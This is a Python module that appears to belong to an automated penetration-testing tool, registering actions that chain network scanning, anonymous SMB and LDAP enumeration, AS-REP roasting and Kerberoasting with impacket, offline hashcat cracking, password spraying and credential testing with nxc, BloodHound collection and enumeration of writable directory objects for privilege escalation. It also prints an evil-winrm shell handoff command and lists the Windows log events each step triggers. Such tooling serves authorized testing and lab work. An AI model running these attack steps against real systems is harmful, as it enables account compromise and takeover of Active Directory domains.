"""
The built-in action catalogue — the single place capabilities are registered.

Each handler is a thin adapter that calls an existing p0rtix function and lets it
push facts through `ctx.facts` (a FactStore passed as `runner.ws`, so the legacy
handler bodies emit unlock events with zero changes). Adding a new tool to the
engine is one `register(...)` call here.

Phase 1 registers the passive actions + the first green vertical slice
(discovery, on-demand version detect, anonymous SMB, anonymous LDAP). Yellow/red
and the session/shell/CVE actions land in later phases.
"""
from __future__ import annotations

import re
from pathlib import Path

from lib import nmap
from lib.engine.action import Action, ActionResult, Footprint, Requirement, Tier
from lib.engine.facts import FactStore, ProtoStatus
from lib.engine.registry import ActionRegistry
from lib.models import Service

_LDAP_PORTS = (389, 636, 3268, 3269)


# ── passive (run at console open; zero packets) ───────────────────────────────
def _h_parse_prior(ctx) -> ActionResult:
    """Load any Service objects from a prior scan's saved nmap XML into facts."""
    found = 0
    for label, proto in (("*_tcp_services.xml", "tcp"), ("*_udp_confirmed.xml", "udp")):
        xml = next(ctx.runner.ws.raw_dir.glob(label), None)
        if xml:
            services = nmap.parse_service_xml(xml, proto)
            if services:
                ctx.facts.set_services(services)
                found += len(services)
    return ActionResult(ok=True, summary=f"loaded {found} service(s) from prior scan")


# ── green: discovery ──────────────────────────────────────────────────────────
def _h_tcp_ports(ctx) -> ActionResult:
    ports = nmap.discover_tcp_open(ctx.ip, ctx.runner, ctx.runner.ws)
    for p in ports:
        ctx.facts.add_open_port("tcp", p)
    ctx.findings.bullet(f"Open TCP ports: {', '.join(map(str, ports)) or 'none'}")
    return ActionResult(ok=True, summary=f"{len(ports)} open TCP port(s)")


def _h_udp_ports(ctx) -> ActionResult:
    ports = nmap.discover_udp(ctx.ip, ctx.runner, ctx.runner.ws)
    for p in ports:
        ctx.facts.add_open_port("udp", p)
    ctx.findings.bullet(f"Open UDP ports: {', '.join(map(str, ports)) or 'none'}")
    return ActionResult(ok=True, summary=f"{len(ports)} open UDP port(s)")


def _open_tcp_ports(facts: FactStore) -> list[dict]:
    return [{"port": p} for (proto, p) in facts.snapshot()["open_ports"] if proto == "tcp"]


def _h_version_detect(ctx) -> ActionResult:
    port = ctx.target_port
    services = nmap.version_detect(ctx.ip, [port], ctx.runner, ctx.runner.ws)
    ctx.facts.add_services(services)
    for s in services:
        ctx.findings.bullet(f"{s.proto}/{s.port}: {s.name} {s.version}".rstrip())
    return ActionResult(ok=True, summary=f"version-detected {port}")


# ── green: anonymous SMB / LDAP (wrap existing handler bodies) ─────────────────
def _h_smb_anon(ctx) -> ActionResult:
    from lib import services
    services._smb_run_null_session(ctx.ip, 445, ctx.runner, ctx.findings, ctx.available)
    return ActionResult(ok=True, summary="anonymous SMB enumeration")


def _ldap_port(facts: FactStore) -> int | None:
    for p in _LDAP_PORTS:
        if facts.has(f"tcp/{p}"):
            return p
    return None


def _h_ldap_anon(ctx) -> ActionResult:
    from lib import services
    port = _ldap_port(ctx.facts) or 389
    svc = Service(port=port, proto="tcp", name="ldap", version="",
                  is_web=False, scheme="", hostname=ctx.domain or "")
    discoveries = services._ldap(ctx.ip, svc, ctx.runner, ctx.findings, ctx.available)
    # If anonymous bind yielded no base DN / users, mark the branch dormant.
    if not ctx.facts.has("users") and not ctx.facts.has("domain"):
        ctx.facts.set_proto_status("ldap", ProtoStatus.ANON_DENIED)
    return ActionResult(ok=True, summary="anonymous LDAP enumeration",
                        discoveries=discoveries or [])


# ── yellow: AS-REP roast (unlocked by domain + a user list) ───────────────────
def _ensure_users_file(facts: FactStore) -> Path:
    """Return loot/users.txt, materialising it from the fact store if add_user
    has not already written it (e.g. users seeded purely in memory)."""
    path = facts.loot_dir / "users.txt"
    if not path.exists() or path.stat().st_size == 0:
        users = facts.snapshot()["users"]
        path.write_text("\n".join(users) + ("\n" if users else ""))
    return path


def _h_asrep_roast(ctx) -> ActionResult:
    domain = ctx.facts.discovered_domain or ctx.domain
    if not domain:
        return ActionResult(ok=False, summary="no domain known")
    users_file = _ensure_users_file(ctx.facts)
    cmd = [
        "impacket-GetNPUsers", f"{domain}/", "-no-pass", "-dc-ip", ctx.ip,
        "-request", "-format", "hashcat", "-usersfile", str(users_file),
    ]
    ctx.findings.cmd(" ".join(cmd))
    out = ctx.runner.run(cmd, "kerb_asrep_GetNPUsers", timeout=180)
    lines = [l.strip() for l in out.splitlines() if "$krb5asrep$" in l]
    if lines:
        ctx.facts.append_krb_hashes("asrep.hash", lines)
        ctx.findings.bullet("**AS-REP roastable hash(es) found — crack with `hashcat -m 18200`**")
        ctx.findings.code_block("\n".join(lines))
        ctx.findings.add_summary("**AS-REP hash(es) in `loot/asrep.hash`** — crack: `hashcat -m 18200`")
        ctx.facts.add_hash("asrep")
        return ActionResult(ok=True, summary=f"{len(lines)} AS-REP hash(es) captured")
    ctx.facts.set_proto_status("kerberos", ProtoStatus.EXHAUSTED)
    return ActionResult(ok=True, summary="no AS-REP roastable accounts")


# ── passive: offline crack (local hashcat; zero packets to target) ────────────
def _h_crack(ctx) -> ActionResult:
    from lib import crack
    cracked = crack.crack_hashes(ctx.facts, ctx.runner, ctx.findings, ctx.available)
    # Record each cracked (user, password) as a targeted pair so creds.test can
    # verify it as itself instead of spraying it across the whole user list.
    for user, password in cracked:
        if user:
            ctx.facts.add_cred_pair(user, password)
    if cracked:
        return ActionResult(ok=True, summary=f"cracked {len(cracked)} password(s)")
    return ActionResult(ok=True, summary="no hashes cracked")


# ── yellow: credential spray (validate candidate passwords → valid_cred) ──────
def _h_creds_spray(ctx) -> ActionResult:
    import p0rtix                                   # late import (avoids cycle)
    open_tcp = [p for (proto, p) in ctx.facts.snapshot()["open_ports"] if proto == "tcp"]
    services = [Service(port=p, proto="tcp", name="", version="", is_web=False,
                        scheme="", hostname="") for p in open_tcp]
    before = len(ctx.facts.snapshot()["valid_creds"])
    p0rtix._run_cred_reuse(ctx.ip, ctx.runner, ctx.findings, ctx.facts,
                           services, ctx.available)
    gained = len(ctx.facts.snapshot()["valid_creds"]) - before
    return ActionResult(ok=True, summary=f"{gained} new valid credential(s)")


# ── yellow: authenticated AD core (unlocked by a valid credential) ────────────
def _pick_enum_cred(facts: FactStore) -> tuple[str, str] | None:
    """Choose a valid credential to enumerate with — prefer a real user account
    over a machine account ($)."""
    valids = facts.snapshot()["valid_creds"]
    for u, p in valids:
        if not u.endswith("$"):
            return (u, p)
    return valids[0] if valids else None


def _enum_cred_or_none(ctx):
    """(domain, user, pw) for authenticated enum, or None if not ready."""
    domain = ctx.facts.discovered_domain or ctx.domain
    cred = _pick_enum_cred(ctx.facts)
    if not domain or cred is None:
        return None
    return domain, cred[0], cred[1]


def _h_ldap_domaindump(ctx) -> ActionResult:
    from lib import credsmode
    ready = _enum_cred_or_none(ctx)
    if ready is None:
        return ActionResult(ok=False, summary="need a domain and a valid credential")
    domain, user, pw = ready
    credsmode._ad_ldapdomaindump(ctx.ip, domain, user, pw, ctx.runner,
                                 ctx.findings, ctx.facts, ctx.available)
    credsmode._ad_enrichment(ctx.ip, domain, user, pw, ctx.runner,
                             ctx.findings, ctx.facts, ctx.available)
    ctx.facts.set_proto_status("ldap", ProtoStatus.EXHAUSTED)
    return ActionResult(ok=True, summary=f"LDAP domain dump as {user}")


def _h_kerberoast(ctx) -> ActionResult:
    from lib import credsmode
    ready = _enum_cred_or_none(ctx)
    if ready is None:
        return ActionResult(ok=False, summary="need a domain and a valid credential")
    domain, user, pw = ready
    credsmode.sync_clock(ctx.ip, ctx.runner, ctx.findings, ctx.available)
    n = credsmode._ad_kerberoast(ctx.ip, domain, user, pw, ctx.runner,
                                 ctx.findings, ctx.facts, ctx.available)
    if n:
        ctx.facts.add_hash("kerberoast")
    return ActionResult(ok=True, summary=f"{n} kerberoastable hash(es)")


def _h_bloodhound(ctx) -> ActionResult:
    from lib import credsmode
    ready = _enum_cred_or_none(ctx)
    if ready is None:
        return ActionResult(ok=False, summary="need a domain and a valid credential")
    domain, user, pw = ready
    zip_path = credsmode._ad_bloodhound(ctx.ip, domain, user, pw, ctx.runner,
                                        ctx.findings, ctx.facts, ctx.available)
    return ActionResult(ok=True,
                        summary=f"bloodhound: {zip_path.name if zip_path else 'no data'}")


def _h_writable_objects(ctx) -> ActionResult:
    from lib import credsmode
    ready = _enum_cred_or_none(ctx)
    if ready is None:
        return ActionResult(ok=False, summary="need a domain and a valid credential")
    domain, user, pw = ready
    targets = credsmode._bloodyad_writable(ctx.ip, domain, user, pw, ctx.runner,
                                           ctx.findings, ctx.facts, ctx.available)
    return ActionResult(ok=True, summary=f"{len(targets or [])} writable object(s)")


# ── yellow: credential access test (verify pairs as-is — no spray) ────────────
def _h_creds_test(ctx) -> ActionResult:
    """Test each known credential pair (cracked pairs + confirmed valid creds)
    against the open auth services as that exact (user, pass) — verification, not
    a user-list spray. Confirmed access is recorded and a handoff command shown."""
    snap = ctx.facts.snapshot()
    pairs = sorted(set(snap["cred_pairs"]) | set(snap["valid_creds"]))
    if not pairs:
        return ActionResult(ok=False, summary="no credential pairs to test")
    if "nxc" not in ctx.available:
        return ActionResult(ok=False, summary="nxc not available")
    open_tcp = {p for proto, p in snap["open_ports"] if proto == "tcp"}
    domain = ctx.facts.discovered_domain or ctx.domain or ""
    services = [("smb", 445), ("winrm", 5985), ("rdp", 3389), ("mssql", 1433)]
    confirmed = 0
    for user, pw in pairs:
        for svc, port in services:
            if port not in open_tcp:
                continue
            cmd = ["nxc", svc, ctx.ip, "-u", user, "-p", pw]
            if domain:
                cmd += ["-d", domain]
            label = re.sub(r"[^a-z0-9]", "_", f"{svc}_{user}".lower())[:24]
            out = ctx.runner.run(cmd, f"credtest_{label}", timeout=60)
            for line in out.splitlines():
                if "[+]" not in line:
                    continue
                confirmed += 1
                if "Pwn3d!" in line:
                    ctx.facts.add_admin_cred(user, pw)
                    ctx.findings.bullet(f"**ADMIN access ({svc}):** `{user}` — {line.strip()}")
                    ctx.findings.add_summary(f"**Admin {svc.upper()} as `{user}`**")
                else:
                    ctx.facts.add_valid_cred(user, pw, svc.upper())
                    ctx.findings.bullet(f"**Valid {svc} access:** `{user}` — {line.strip()}")
                if svc == "winrm":
                    ctx.findings.add_summary(
                        f"WinRM shell handoff: `evil-winrm -i {ctx.ip} -u {user} -p {pw}`")
                break
    return ActionResult(ok=True,
                        summary=f"tested {len(pairs)} pair(s) — {confirmed} access hit(s)")


def build_registry() -> ActionRegistry:
    reg = ActionRegistry()

    reg.register(Action(
        "recon.parse_prior", Tier.PASSIVE, _h_parse_prior,
        group="discovery", order=0,
        footprint=Footprint(summary="reads saved nmap XML (local only)"),
        gate=lambda f: any(f.machine_dir.joinpath("raw").glob("*_services.xml")),
    ))

    reg.register(Action(
        "discovery.tcp_ports", Tier.GREEN, _h_tcp_ports,
        group="discovery", order=1,
        footprint=Footprint(
            summary="full TCP SYN sweep",
            network="SYN sweep — firewall connection logs / IDS port-scan signature",
        ),
        deps=("nmap",),
    ))
    reg.register(Action(
        "discovery.udp_top100", Tier.GREEN, _h_udp_ports,
        group="discovery", order=2,
        footprint=Footprint(summary="top-100 UDP sweep",
                            network="UDP probes — firewall/IDS"),
        deps=("nmap",),
    ))
    reg.register(Action(
        "svc.version_detect", Tier.GREEN, _h_version_detect,
        group="discovery", order=3,
        footprint=Footprint(summary="per-port -sV banner grab",
                            network="extra connection + banner grab per port"),
        gate=lambda f: bool(_open_tcp_ports(f)),
        instances=_open_tcp_ports,
        requires=(Requirement("open_tcp", "an open TCP port"),),
        deps=("nmap",),
    ))

    reg.register(Action(
        "smb.anon_enum", Tier.GREEN, _h_smb_anon,
        group="smb", order=1,
        footprint=Footprint(
            summary="anonymous SMB: null session, RID cycle, shares, users",
            windows_events=("4624 (type 3, often below audit)",),
        ),
        gate=lambda f: f.has("tcp/445"),
        requires=(Requirement("tcp/445", "SMB (tcp/445) open"),),
        deps=("nxc",),
        supersedes=("smb.enum4linux",),     # no-overlap: this covers enum4linux ground
    ))

    reg.register(Action(
        "ldap.anon_bind", Tier.GREEN, _h_ldap_anon,
        group="ldap", order=1,
        footprint=Footprint(summary="anonymous LDAP bind + directory reads"),
        gate=lambda f: _ldap_port(f) is not None,
        requires=(Requirement("ldap_port", "LDAP (tcp/389|636|3268|3269) open"),),
        deps=("ldapsearch",),
        # once anon bind is denied, don't keep re-offering it — the branch waits
        # for a credential (or an operator `recheck ldap`).
        suppressed_by=(ProtoStatus.ANON_DENIED,),
    ))

    reg.register(Action(
        "kerberos.asrep_roast", Tier.YELLOW, _h_asrep_roast,
        group="kerberos", order=1,
        footprint=Footprint(
            summary="AS-REP roast: one AS-REQ (no pre-auth) per known user",
            windows_events=("4768 (TGT requested)", "4771 (pre-auth failed)"),
        ),
        gate=lambda f: f.has("domain") and f.has("users"),
        requires=(Requirement("domain", "a domain"),
                  Requirement("users", "a user list")),
        deps=("impacket-GetNPUsers",),
    ))

    reg.register(Action(
        "crack.hashes", Tier.PASSIVE, _h_crack,
        group="creds", order=1,
        footprint=Footprint(
            summary="offline hashcat + rockyou on captured hashes (local only)"),
        gate=lambda f: f.has("hash"),
        requires=(Requirement("hash", "a captured hash (AS-REP/Kerberoast/NTLM)"),),
        deps=("hashcat",),
    ))

    reg.register(Action(
        "creds.test", Tier.YELLOW, _h_creds_test,
        group="creds", order=2,
        footprint=Footprint(
            summary="verify known credential pair(s) for access — not a spray",
            windows_events=("4624 (logon) on a hit", "4625 (failed logon)"),
        ),
        gate=lambda f: (f.has("cred_pair") or f.has("valid_cred")) and f.has("tcp/445"),
        requires=(Requirement("cred_pair", "a credential pair (cracked/known)"),
                  Requirement("tcp/445", "SMB (tcp/445) open")),
        deps=("nxc",),
    ))

    reg.register(Action(
        "creds.spray", Tier.YELLOW, _h_creds_spray,
        group="creds", order=3,
        footprint=Footprint(
            summary="spray candidate password(s) across the whole user list (SMB/WinRM)",
            windows_events=("4625 (failed logon)", "4624 (logon) on a hit"),
        ),
        gate=lambda f: f.has("cred") and f.has("tcp/445"),
        requires=(Requirement("cred", "a candidate password (cracked/leaked)"),
                  Requirement("tcp/445", "SMB (tcp/445) open")),
        deps=("nxc",),
    ))

    # Authenticated AD enumeration, decomposed into one-decision-per-action steps
    # (replacing the monolithic ad.authenticated_core). All gated valid_cred+domain.
    _authed = lambda f: f.has("valid_cred") and f.has("domain")  # noqa: E731
    _authed_reqs = (Requirement("valid_cred", "a valid credential"),
                    Requirement("domain", "a domain"))

    reg.register(Action(
        "ldap.domaindump", Tier.YELLOW, _h_ldap_domaindump,
        group="ldap", order=2,
        footprint=Footprint(
            summary="authenticated LDAP dump + enrichment (delegation/MAQ/policy)",
            windows_events=("4662 (directory reads)",)),
        gate=_authed, requires=_authed_reqs, deps=("ldapdomaindump",),
    ))
    reg.register(Action(
        "kerberos.kerberoast", Tier.YELLOW, _h_kerberoast,
        group="kerberos", order=2,
        footprint=Footprint(
            summary="request TGS for SPN accounts → crackable hashes",
            windows_events=("4769 (TGS requested)",)),
        gate=_authed, requires=_authed_reqs, deps=("impacket-GetUserSPNs",),
    ))
    reg.register(Action(
        "bloodhound.collect", Tier.YELLOW, _h_bloodhound,
        group="ad", order=1,
        footprint=Footprint(
            summary="BloodHound collection (All, DCOnly fallback) → attack paths",
            windows_events=("4662 (directory reads)",)),
        gate=_authed, requires=_authed_reqs, deps=("bloodhound-python",),
    ))
    reg.register(Action(
        "ad.writable_objects", Tier.YELLOW, _h_writable_objects,
        group="ad", order=2,
        footprint=Footprint(
            summary="enumerate writable users/groups/computers (privesc targets)"),
        gate=_authed, requires=_authed_reqs, deps=("bloodyAD",),
    ))

    return reg
